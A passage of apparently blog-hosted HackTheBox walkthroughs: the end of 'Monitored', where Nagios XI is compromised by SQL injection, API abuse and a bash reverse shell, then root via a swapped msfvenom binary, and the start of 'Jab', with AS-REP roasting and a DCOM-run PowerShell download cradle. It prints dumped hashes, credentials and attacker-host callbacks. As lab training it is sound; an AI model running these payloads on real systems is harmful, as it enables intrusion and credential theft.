â¬```bashferoxbuster -u https://nagios.monitored.htb/ -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 100 --depth 5 -C 403,404,503,502 -o ferox_all.json```{: .nolineno}![Image](Pasted%20image%2020240417145509.png)Also going deeper and found there â¬```bashferoxbuster -u https://nagios.monitored.htb/nagiosxi/api/ -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 100```{: .nolineno}![Image](Pasted%20image%2020240417145726.png)I got some directories which are now related to API pentesting so lets explore some more into these directories like authenticate that will provide me api token that will help me login to that particular user, In this case the user is svc that we get from SNMP enumeration.![Image](Pasted%20image%2020240419134542.png)_Must be valid username and password_Let provide the username and password â¤µï¸![Image](Pasted%20image%2020240417144559.png)_authenticating through api and getting token from it_As I got the token for user **svc** so lets include that in as header or can be included as parameter also â¬![Image](Pasted%20image%2020240417144805.png)_token for login authentication success_Now I am logged in so lets move further â¬![Image](Pasted%20image%2020240417150602.png)_Dashboard Page_I recon related to this version of nagios_XI and I got this blog that stats a vulnerability for this version â¬https://outpost24.com/blog/nagios-xi-vulnerabilities/![Image](Pasted%20image%2020240418100852.png)_SQLi methodology for CVE-2023-40931_Lets use **sqlmap** to do this attack â¬```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Monitored]â””â”€$ sudo sqlmap --flush-session -u \"https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=1\" --batch --cookie=\"nagiosxi=badl0hq9bnkpfsvg9s5f5q016f\" --dump -p id --dbms=mysql --threads=10```{: .nolineno}![Image](Pasted%20image%2020240418101217.png)_Vulnerability found though SQLMAP Tool_Lets explore the data from **nagiosxi** database and of **xi_users** table â¬| user_id | email | name | api_key | enabled | password | username | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket | last_edited_by | login_attempts | last_password_change || ------- | ------------------- | -------------------- | ---------------------------------------------------------------- | ------- | ------------------------------------------------------------ | ----------- | ---------- | ---------- | ----------- | ----------- | ------------ | ------------ | ---------------------------------------------------------------- | -------------- | -------------- | -------------------- || 1 | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1 | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | nagiosadmin | 0 | 1701931372 | 1 | 1701427555 | 0 | 0 | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0 | 5 | 0 | 1701427555 || 2 | svc@monitored.htb | svc | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0 | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | svc | 1 | 1699724476 | 1 | 1699728200 | 1699634403 | 1713414794 | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1 | 6 | 1699697433 |I have api_keys now from admin so lets use this api_keys in other directories to access data as they were demanding for API keys like this â¬![Image](Pasted%20image%2020240419130731.png)_error related to API key_Now lets include API key but how to include I did not new so I searched for add new users to Nagios XI and I stumbled across this blog that gives me the hint that I needed to progress further â¬https://support.nagios.com/forum/viewtopic.php?t=42923![Image](Pasted%20image%2020240419090853.png)_Data related to login users_This means I can also add users in it like this I guessed â¬![Image](Pasted%20image%2020240419092737.png)_New User add Entry in POST request_I provided all the data and send the request and I successfully registered a user named as **strongshiv8**.![Image](Pasted%20image%2020240419092706.png)_New user added_I logged in by proving the token as I captured earlier process and proceeded further , I got a password reset page like this â¬![Image](Pasted%20image%2020240419093437.png)_Password Reset Page_But the thing is I want to be an admin user and for that I again recon into the web and found this blog that lets me register a user as admin privileges â¬https://support.nagios.com/forum/viewtopic.php?f=6&t=40502![Image](Pasted%20image%2020240419095439.png)_New user as strongshiv name and privileged as admin_Again I logged in as strongshiv new user and this time I got a License Page â¬![Image](Pasted%20image%2020240419095619.png)_License Agreement Page_I got the Admin dashboard page so lets move to SSH terminal option and I think I could execute some commands .![Image](Pasted%20image%2020240419095908.png)_Path toward SSH Terminal Page_I got into this page â¬![Image](Pasted%20image%2020240419095951.png)_It did not worked_I moved on and this time , My plan is to include a Command and then that command will be served in a service like this â¬Lets move to Navigation > Config > Advanced Configuration > 148 CommandsHere I will be including a Command â¬![Image](Pasted%20image%2020240419100518.png)_Navigated path to Commands_Click on Add New commands â¬![Image](Pasted%20image%2020240419100645.png)_Command Add_Now I will be adding a reverse shell command â¬```bashbash -c 'bash -i >& /dev/tcp/10.10.16.17/4444 0>&1'```{: .nolineno}Save it and Now move to services to use that command that I made right now â¬![Image](Pasted%20image%2020240419101204.png)_Service Page_Add New services into this CMS site â¬![Image](Pasted%20image%2020240419101227.png)_Add New Services into it_Now select the command that was added earlier â¬![Image](Pasted%20image%2020240419101413.png)_Selected the same command the we made earlier_Lets Run Check Command to make it work ðŸ”»![Image](Pasted%20image%2020240419101729.png)_Reverse Shell is executed_As a result of that I got a Local Privileged Escalation on this machine as user **nagios** â¬```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Monitored]â””â”€$ rlwrap nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.16.17] from (UNKNOWN) [10.10.11.248] 38024bash: cannot set terminal process group (5334): Inappropriate ioctl for devicebash: no job control in this shellnagios@monitored:~$ whoamiwhoaminagiosnagios@monitored:~$ ididuid=1001(nagios) gid=1001(nagios) groups=1001(nagios),1002(nagcmd)nagios@monitored:~$ ```{: .nolineno}For root privileges I checked `sudo -l` and got this â¬```bashnagios@monitored:~$ sudo -lsudo -lMatching Defaults entries for nagios on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser nagios may run the following commands on localhost: (root) NOPASSWD: /etc/init.d/nagios start (root) NOPASSWD: /etc/init.d/nagios stop (root) NOPASSWD: /etc/init.d/nagios restart (root) NOPASSWD: /etc/init.d/nagios reload (root) NOPASSWD: /etc/init.d/nagios status (root) NOPASSWD: /etc/init.d/nagios checkconfig (root) NOPASSWD: /etc/init.d/npcd start (root) NOPASSWD: /etc/init.d/npcd stop (root) NOPASSWD: /etc/init.d/npcd restart (root) NOPASSWD: /etc/init.d/npcd reload (root) NOPASSWD: /etc/init.d/npcd status (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php * (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php * (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php * (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh * (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh * (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *nagios@monitored:~$ ```{: .nolineno}This script `/usr/local/nagiosxi/scripts/manage_services.sh` takes 2 arguments that means I can play with these arguments : ```bash# Things you can dofirst=(\"start\" \"stop\" \"restart\" \"status\" \"reload\" \"checkconfig\" \"enable\" \"disable\")second=(\"postgresql\" \"httpd\" \"mysqld\" \"nagios\" \"ndo2db\" \"npcd\" \"snmptt\" \"ntpd\" \"crond\" \"shellinaboxd\" \"snmptrapd\" \"php-fpm\")```{: .nolineno}So What I will be doing is that , I will be replacing the nagios executable from a reverse shell nagios file .I used msfvenom to create an exploit like this â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Monitored]â””â”€$ msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.16.17 LPORT=4444 -f elf -o nagios[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 123 bytesFinal size of elf file: 207 bytesSaved as: nagios```{: .nolineno}I transferred it to the place where the original nagios was stored and Now lets start the **msfconsole** that gona catch the reverse shell when it will be triggered , Lastly run this script as root user â¬```bashnagios@monitored:~$ sudo -u root /usr/local/nagiosxi/scripts/manage_services.sh restart nagios /dev/null-rw-r--r-- 1 root root 571 Apr 10 2021 .bashrcdrwxr-xr-x 2 root root 4096 Dec 7 03:22 .cachedrwx------ 4 root root 4096 Nov 11 03:54 .configdrwxr-xr-x 6 root root 4096 Jan 8 13:11 .cpandrwx------ 3 root root 4096 Nov 9 10:23 .gnupgdrwxr-xr-x 3 root root 4096 Nov 10 12:02 .local-rw-r--r-- 1 root root 161 Jul 9 2019 .profiledrwx------ 2 root root 4096 Dec 7 01:50 .ssh-rw-r----- 1 root root 33 Apr 19 00:00 root.txtroot@monitored:/root# cat root.txtcat root.txt7baaeba08119966c9ba14a0017484bc5root@monitored:/root#```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Jab", "url": "/posts/Jab/", "categories": "HackTheBox", "tags": "MSRPC, Jabber, ASREPRoast, Active Directory, Pidgin, Gajim, XMPP_Client, Port Forwarding, Public Exploit, dcomexec.py, DCOM, PrivEsc", "date": "2024-04-27 00:00:00 +0530", "snippet": "| Machine Link | [https://app.hackthebox.com/machines/Jab](https://app.hackthebox.com/machines/Jab) || ------------------ | -------------------------------------------------------------------...", "content": "| Machine Link | [https://app.hackthebox.com/machines/Jab](https://app.hackthebox.com/machines/Jab) || ------------------ | ---------------------------------------------------------------------------------- || Operating System | Windows (Active Directory) || Difficulty | Medium || Machine Created by | [mrb3n](https://app.hackthebox.com/users/2984) |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Jab]â””â”€$ sudo nmap -sC -sV -T4 -oN Nmap_Results.txt 10.10.11.4 -Pn[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-22 09:30 ISTWarning: 10.10.11.4 giving up on port because retransmission cap hit (6).Nmap scan report for 10.10.11.4Host is up (0.82s latency).Not shown: 984 closed tcp ports (reset)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-04-22 04:03:01Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=DC01.jab.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:DC01.jab.htb| Not valid before: 2023-11-01T20:16:18|_Not valid after: 2024-10-31T20:16:18|_ssl-date: 2024-04-22T04:05:17+00:00; 0s from scanner time.445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)|_ssl-date: 2024-04-22T04:05:02+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=DC01.jab.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:DC01.jab.htb| Not valid before: 2023-11-01T20:16:18|_Not valid after: 2024-10-31T20:16:183268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=DC01.jab.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:DC01.jab.htb| Not valid before: 2023-11-01T20:16:18|_Not valid after: 2024-10-31T20:16:18|_ssl-date: 2024-04-22T04:05:07+00:00; 0s from scanner time.3269/tcp open globalcatLDAPssl?| ssl-cert: Subject: commonName=DC01.jab.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:DC01.jab.htb| Not valid before: 2023-11-01T20:16:18|_Not valid after: 2024-10-31T20:16:18|_ssl-date: 2024-04-22T04:05:02+00:00; 0s from scanner time.5222/tcp open jabber| ssl-cert: Subject: commonName=dc01.jab.htb| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb| Not valid before: 2023-10-26T22:00:12|_Not valid after: 2028-10-24T22:00:12|_xmpp-info: ERROR: Script execution failed (use -d to debug)|_ssl-date: TLS randomness does not represent time| fingerprint-strings: | RPCCheck: |_ 5269/tcp open xmpp Wildfire XMPP Client|_xmpp-info: ERROR: Script execution failed (use -d to debug)7070/tcp open realserver?| fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP: | HTTP/1.1 400 Illegal character CNTL=0x0| Content-Type: text/html;charset=iso-8859-1| Content-Length: 69| Connection: close| Bad Message 400reason: Illegal character CNTL=0x0| GetRequest: | HTTP/1.1 200 OK| Date: Mon, 22 Apr 2024 04:02:59 GMT| Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT| Content-Type: text/html| Accept-Ranges: bytes| Content-Length: 223| | Openfire HTTP Binding Service| Openfire HTTP Binding Service| | HTTPOptions: | HTTP/1.1 200 OK| Date: Mon, 22 Apr 2024 04:03:11 GMT| Allow: GET,HEAD,POST,OPTIONS| Help: | HTTP/1.1 400 No URI| Content-Type: text/html;charset=iso-8859-1| Content-Length: 49| Connection: close| Bad Message 400reason: No URI| RPCCheck: | HTTP/1.1 400 Illegal character OTEXT=0x80| Content-Type: text/html;charset=iso-8859-1| Content-Length: 71| Connection: close| Bad Message 400reason: Illegal character OTEXT=0x80| RTSPRequest: | HTTP/1.1 505 Unknown Version| Content-Type: text/html;charset=iso-8859-1| Content-Length: 58| Connection: close| Bad Message 505reason: Unknown Version| SSLSessionReq: | HTTP/1.1 400 Illegal character CNTL=0x16| Content-Type: text/html;charset=iso-8859-1| Content-Length: 70| Connection: close|_ Bad Message 400reason: Illegal character CNTL=0x167443/tcp open ssl/oracleas-https?| ssl-cert: Subject: commonName=dc01.jab.htb| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb| Not valid before: 2023-10-26T22:00:12|_Not valid after: 2028-10-24T22:00:12|_ssl-date: TLS randomness does not represent time| fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK| Date: Mon, 22 Apr 2024 04:03:14 GMT| Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT| Content-Type: text/html| Accept-Ranges: bytes| Content-Length: 223| | Openfire HTTP Binding Service| Openfire HTTP Binding Service| | HTTPOptions: | HTTP/1.1 200 OK| Date: Mon, 22 Apr 2024 04:03:33 GMT| Allow: GET,HEAD,POST,OPTIONS| RTSPRequest: | HTTP/1.1 505 Unknown Version| Content-Type: text/html;charset=iso-8859-1| Content-Length: 58| Connection: close|_ Bad Message 505reason: Unknown Version7777/tcp open socks5 (No authentication; connection not allowed by ruleset)3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)=======SF-Port5222-TCP:V=7.94SVN%I=7%D=4/22%Time=6625E18F%P=x86_64-pc-linux-gnu%rSF:(RPCCheck,9B,\"\");```{: .nolineno}{: file='Nmap_Results.txt' .nolineno}## Web Enumeration â¤µï¸I checked port 7443 and 7070 but the response was this â¬![Image](Pasted%20image%2020240426082118.png)_Openfire redirect page_So Now I checked port 5222 which indicated jabber was running but this port is actually for xmpp-client service running.- AnÂ **XMPP client**Â is any software or application that enables you to connect to an XMPP for instant messaging with other people over the Internet. There are many free clients you can use to do this, for many different devices and operating systems.![Image](Pasted%20image%2020240426083112.png)_These are the free clients ,Reference: https://jabber.at/clients/_I will be using [Gajim](https://gajim.org/) and [pidgin](https://pidgin.im/) both Tools on the way â¬Lets use Pidgin Tool first â¬Install this tool like this ðŸ”»```bashsudo apt install pidgin```{: .nolineno}- Register a user with any Username, Email, Password but the server address should be the machine address that is `10.10.11.4` and the domain name will be `jab.htb` .![Image](Pasted%20image%2020240423151426.png)- There is a plugin called Service Discovery , Enable it then use it to discover what services are involved with which subdomains along with its chats.![Image](Pasted%20image%2020240426084714.png)_Enabling Service Discovery Plugin_- Now the plugin is up so lets look for services from this server and I found these many , into a subdomain service called `conference.jab.htb` I got 2 chats â¬![Image](Pasted%20image%2020240423153005.png)_Accessing Chats_- Now lets look for User Information from here â¬![Image](Pasted%20image%2020240423155148.png)_User Enumeration_- I have to enter the Service Discovery name that I identified above that indicates the Search for user info that is `search.jab.htb`.![Image](Pasted%20image%2020240423155219.png)_Specifying the subdomain name_- Here I can filter out the output or we can access all the data by giving asterisk (\\*) as an input like this â¬![Image](Pasted%20image%2020240423155257.png)_Sorting the output_- As a result I got these 2000+ many output as usernames â¬![Image](Pasted%20image%2020240423155356.png)_Users Informations_There is another Tool called [Gajim](https://gajim.org/) that can be installed by this command in Debian machines â¬```bashsudo apt install gajim```{: .nolineno}Now Lets run this Tool â¬- Firstly I will be signing up with server name as `jab.htb` and with enabled **Sign up Anonymously** option.![Image](Pasted%20image%2020240423220144.png)_Sign Up process_- There is a warning page with will pop up like this , ignore that â¬![Image](Pasted%20image%2020240423220226.png)_Certificate verification popup_- I got this successful page â¬![Image](Pasted%20image%2020240423220625.png)- Now lets set the hostname for enabling the server connection â¬![Image](Pasted%20image%2020240423220810.png)_Turn the Hostname option On and specify its address_- Specify the Address of the server in this case the machine IP and the Type will be plain that will not be encrypted .![Image](Pasted%20image%2020240424081534.png)_Connection establishing_- As the Account setup so lets look into the Discover Services option with similar fashion like I did in Pidgin Tool.![Image](Pasted%20image%2020240424081257.png)_Discover Services option_- Enumerate the User Search Discovery further more â¬![Image](Pasted%20image%2020240424081347.png)_User Info Search discovery_- Lets sort the output now â¬![Image](Pasted%20image%2020240424081433.png)_Sorting the output_- As a result I got the usernames â¬![Image](Pasted%20image%2020240424081618.png)_Users Informations_But in all these Tools the problem was to copy all these Users Information at once , that was not possible so I recon further related to it and I got one hint that I could capture the Informations in packets with tcpdump Tool and then sort them like this â¬ ```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Jab]â””â”€$ sudo tcpdump -i tun0 -w users.pcap```{: .nolineno}I started the tcpdump Tool to capture the data on this tun0 interface and then searched all the users information again and then I stopped the capture.Its time to sort the output that is captured in this `users.pcap` file , I will be using â¬- `grep` - Shorting the output.- `-a` - This options specify to filter out the text content only- `-E` - Interpret PATTERN as extended regular expressions- `'@'` - Sorting Pattern string.- `strings` - This will print out the text part in a binary file.```bashcat users.pcap | grep -aE '@' | strings```{: .nolineno}![Image](Pasted%20image%2020240424080825.png)_Users Info sorted_Lets filter out the usernames only â¬```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Jab]â””â”€$ cat users.pcap |grep -aE '@' | strings | grep '' | sed \"s//\\n/g\" | grep 'Username' | cut -d '>' -f 8 | cut -d ' usernames.txt```{: .nolineno}As a result I got these username â¬```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Jab]â””â”€$ more usernames.txt nenglertaslaterrtruelovepwoodlandpparodimhernandezatorresapughlrayrowensmherronlarroyocsalinasplewiscmaxwellkaddismolivarezlbraggilaboy```{: .nolineno}As I got the usernames lets look for TGT tickets with AS-REP-ROASTING method through impacket Tool called GetNPUsers.py .```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Jab]â””â”€$ /opt/Tools/impacket/examples/GetNPUsers.py -no-pass 'jab.htb/' -dc-ip 10.10.11.4 -request -usersfile usernames.txt Impacket v0.12.0.dev1 - Copyright 2023 Fortra[-] invalid principal syntax[-] User nenglert does not have UF_DONT_REQUIRE_PREAUTH set[-] User aslater does not have UF_DONT_REQUIRE_PREAUTH set[-] User rtruelove does not have UF_DONT_REQUIRE_PREAUTH set[-] User pwoodland does not have UF_DONT_REQUIRE_PREAUTH set[-] User pparodi does not have UF_DONT_REQUIRE_PREAUTH set[-] User mhernandez does not have UF_DONT_REQUIRE_PREAUTH set[-] User atorres does not have UF_DONT_REQUIRE_PREAUTH set[-] User apugh does not have UF_DONT_REQUIRE_PREAUTH set........$krb5asrep$23$jmontgomery@JAB.HTB:1d32911586a3b7d810ef3eb0fe08cd88$da838065062d5def822642eb12db36093c5a24f4d95d62ddf9a39f77607935589ed18b814e9129fc9fd6ffb3b5a346a2f52f6d34693870ce86c9521cdf6a8ee66baacee4795c3cd6f5d1833db0e896b2d8d188e0b65a8439db97cae7c4970239ada8441ab6b81eca9346dbbebd5bb7af6f66f6a8f4944102328f8156828be71044b7d38a238cc611794236636c98c5e602ee41c5150f918ed4ede45ddf499ef28524ca44e176a97da17660a3b345e533a393a8b75969b1a9a4c067ac2057adb2dbbb20b84779b7d375f99c38a8057ff16bb2ea9f9817bef5d097369140b794bb2f1f...$krb5asrep$23$lbradford@JAB.HTB:c8f4dbb3df6544bf732dc692b8360648$cb4b9804e0422730921cfd566e692ef8d567dde1241bd04ec7ee10891229d1c0703b40d5946ce411713b534ed4e9ef53a94557676bc0326b48839f210388b2f7a6e55dea66e0a5fd290ab1261cf4047525a3582bf50d05b24f92d5b08f953c7d649b96172b809e9dff09270cfc8df6980a2160b638129f8836863c91c0f7e2eaec1a94a5a85160e86f9f3e4205c86827ad1a45291479f43f61a6dca77888579c33f62624a92898c259caa16834cd5377435408364ced573363fda91c0c9a5459a156eb582f95d94b071ef7303ed942ca763685b2a5a828a2e3daf24e44f6b3b75242...$krb5asrep$23$mlowe@JAB.HTB:c17501d904091a954dcb12c72e4cf0ff$4af5f48051e8576615e5fbe7cbb0b33c7c0dce4feed5b5a7642e37a44b074378550b4b38cf181d9b4dcb05834dce1a297ed4bcf73db72a98afcead8e78e940642142b605dad5599d70e98555ac877e28e441ea108b58ecebd9cf2171389a1a9dd964526875a25e41dde6c04da707328f270bfafc857490f1c164da9111b98015b45b0ae945252b5007efb960d5f00d656cd75cac3568fa6fa9fe132eb8692cb1afa9b5e7b5443fa7ae244e00e575d2a73e85b4cb0156d352bfbf51c7fd5598cc683d7f74e2a2513d2584c2bcfbcea2eccefc3698655708951a31e243f209ea86f8ad```{: .nolineno}After a while I got 3 tickets and I try to crack all but got only 1 user result that is of user jmontgomery .Lets login that user into gajim application â¬ ![Image](Pasted%20image%2020240424091227.png)_Login as jmontgomery user_Lets discover its running services ðŸ”½![Image](Pasted%20image%2020240424094111.png)_jmontgomery running services_In public chatrooms I found a wildcard chat entry from pentest2003 user â¬![Image](Pasted%20image%2020240424094010.png)_Public Chatrooms Entry_I get 1 different chat that is from pentest2003 ID .![Image](Pasted%20image%2020240424093926.png)_Chats_While enumeration I also found some users that are affiliated with this chat â¬![Image](Pasted%20image%2020240424093412.png)_Affilicated users_I was unable to print the chat history for pentest2003 from gajim application so I used pidgin Tool to take a look and I got this â¬I logged in as jmontgomery user in pidgin and entered its password with server address and clicked on Save.![Image](Pasted%20image%2020240424104610.png)_Logged in as jmontgomery user in Pidgin Tool_It can ask for password of this user , Enter it and the connection will be established , Now you can check the `Room List` tab , along with its chats. ![Image](Pasted%20image%2020240424104352.png)_Check the chats from Room List option_I got this chat history from this pentest2003 user â¬![Image](Pasted%20image%2020240424104030.png)_It stored a TGS ticket along with cracked password_A TGS ticket along with cracked password of user svc_openfire ,Lets take a look what this user can do here â¬I have created an automation script from netexec Tool that will test all the services for me with one input creds â¬```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Jab/CVE-2023-32315]â””â”€$ python3 /opt/Tools/allexec.py 10.10.11.4 svc_openfire '!@#$%^&*(1qazxsw' â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•— â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â•šâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â•â• â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â•â• â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ•â• â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â• â•šâ•â•â•šâ•â•â•â•â•â•â• â•šâ•â•â•â•â•â•+-+-+-+-+-+-+-+-+-+-+-+|S|T|R|O|N|G|S|H|I|V|8|+-+-+-+-+-+-+-+-+-+-+-+Running smb test:SMB 10.10.11.4 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:jab.htb) (signing:True) (SMBv1:False)SMB 10.10.11.4 445 DC01 [+] jab.htb\\svc_openfire:!@#$%^&*(1qazxsw SMB 10.10.11.4 445 DC01 [*] Enumerated sharesSMB 10.10.11.4 445 DC01 Share Permissions RemarkSMB 10.10.11.4 445 DC01 ----- ----------- ------SMB 10.10.11.4 445 DC01 ADMIN$ Remote AdminSMB 10.10.11.4 445 DC01 C$ Default shareSMB 10.10.11.4 445 DC01 IPC$ READ Remote IPCSMB 10.10.11.4 445 DC01 NETLOGON READ Logon server share SMB 10.10.11.4 445 DC01 SYSVOL READ Logon server share Running ldap test:SMB 10.10.11.4 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:jab.htb) (signing:True) (SMBv1:False)LDAPS 10.10.11.4 636 DC01 [+] jab.htb\\svc_openfire:!@#$%^&*(1qazxsw Running rdp test:Running winrm test:SMB 10.10.11.4 445 DC01 [*] Windows 10.0 Build 17763 (name:DC01) (domain:jab.htb)WINRM 10.10.11.4 5985 DC01 [-] jab.htb\\svc_openfire:!@#$%^&*(1qazxsw```{: .nolineno}Since it does not allow for winrm access so in this case whenever the MSRPC is up that indicates that DCOM is also runinig and that can provide me the shell.> Distributed Component Object Model (`DCOM`) objects present an interesting capability for network-based interactions with objects. Microsoft provides comprehensive documentation for both DCOM and Component Object Model (COM), accessible [here for DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) and [here for COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx).{: .prompt-tip }There is a Tool in impacket that interact with its network .[dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py) Tool .The purpose ofÂ `dcomexec`Â is similar toÂ `wmiexec`, execute commands on a remote endpoint. The underlying execution method, however, is different. In fact, withÂ `dcomexec`Â we will use specificÂ [DCOM techniques](https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f)Â to execute commands such as:- `MMC2.0`- `ShellBrowserWindow`- `ShellWindows`The execution against a testing system would look like this:```bashpython3 /opt/Tools/impacket/examples/dcomexec.py -object MMC20 jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 'cmd.exe /c powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADEAOAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQA=' -silentcommand```{: .nolineno}Payload I used in powershell to execute a reverse shell â¬```bashâ”Œâ”€â”€(kaliã‰¿kali)-[/opt/Tools/PowerShell/nishang/Shells]â””â”€$ echo -n 'IEX(New-Object Net.WebClient).downloadString(\"http://10.10.16.18/Invoke-PowerShellTcp.ps1\")'| iconv --to-code UTF-16LE | base64 -w 0 